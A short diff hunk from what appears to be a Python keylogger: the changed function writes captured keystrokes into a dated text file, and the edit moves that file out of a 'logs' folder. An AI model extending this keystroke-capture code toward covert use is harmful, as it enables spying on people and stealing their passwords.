@@ -20,7 +20,7 @@ def on_press(key):
 
 
 def write_file(keys):
-    with open(f"logs\\log_{datetime.today().strftime('%Y-%m-%d')}.txt", "a") as file:
+    with open(f"log_{datetime.today().strftime('%Y-%m-%d')}.txt", "a") as file:
         for key in keys:
             k = str(key).replace("'", "\n")
             if k.find("space") > 0:
